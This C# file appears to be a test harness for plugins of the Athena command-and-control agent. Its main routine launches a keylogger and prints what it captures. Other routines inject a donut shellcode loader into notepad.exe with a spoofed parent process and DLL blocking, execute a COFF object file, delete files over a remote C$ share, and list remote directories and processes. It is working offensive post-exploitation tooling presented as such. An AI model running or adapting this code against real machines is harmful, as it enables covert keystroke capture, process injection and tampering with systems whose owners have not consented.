using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Linq;
using System.Text;
using Athena.Commands.Models;
using System.Runtime.Serialization;
using Newtonsoft.Json;
using Plugins;
using Athena.Commands;
using Athena.Utilities;
using System.Threading.Tasks;

namespace TestPluginLoader
{
    class Program
    {
        public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
        static async Task Main(string[] args)
        {
            Console.WriteLine("Starting Keylogger.");
            Task.Run(() => TestKeylogger());
            Console.WriteLine("Delaying.");
            await Task.Delay(10000);
            Console.WriteLine("Done.");
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
            Console.WriteLine("Finished.");
            Console.ReadKey();
        }

        static async Task TestCoff()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\whoami.x64.o")));
            parameters.Add("functionName", "go");
            parameters.Add("arguments","");
            parameters.Add("timeout", "30");

            parameters.Add("task-id", "1");
            new Coff().Execute(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestShellcodeInject()
        {
            string json = "{\"blockDlls\":false , \"output\":false}";

            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);

            //Dictionary<string, string> parameters = new Dictionary<string, string>();
            //parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\Seatbelt\Seatbelt.bin")));
            System.Diagnostics.Process[] p = System.Diagnostics.Process.GetProcessesByName("explorer");
            parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\donut\loader.bin")));
            parameters.Add("arguments", "");
            parameters.Add("processName", "notepad.exe");
            parameters.Add("parent", p.FirstOrDefault().Id.ToString());
            parameters.Add("blockdlls", "true");
            //parameters.Add("functionName", "go");
            //parameters.Add("timeout", "60");
            parameters.Add("task-id", "1");
            IPlugin plugin = new InjectShellcode();

            plugin.Execute(parameters);

            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }
        static async Task TestRm()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("host", "mydesktop");
            parameters.Add("path", @"C$\Users\scott\Downloads\");
            parameters.Add("file", "test.txt");
            parameters.Add("task-id", "1");
            new Rm().Execute(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestLs()
        {
            //string json = """{"path": "Users\\scott\\source\\repos\\Athena\\athena", "host": "DESKTOP-GRJNOH2"}""";
            string json = """{"path": "C:", "host": "DESKTOP-GRJNOH2"}""";
            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);
            parameters.Add("task-id", "1");
            IPlugin plug = new Ls();

            plug.Execute(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());

        }

        static async Task TestPs()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("task-id", "1");
            new Ps().Execute(parameters);
            var res = await TaskResponseHandler.GetTaskResponsesAsync();
            Console.WriteLine(res.FirstOrDefault());
        }

        static async Task TestKeylogger()
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("task-id", "1");
            new Keylogger().Execute(parameters);
        }
    }
}
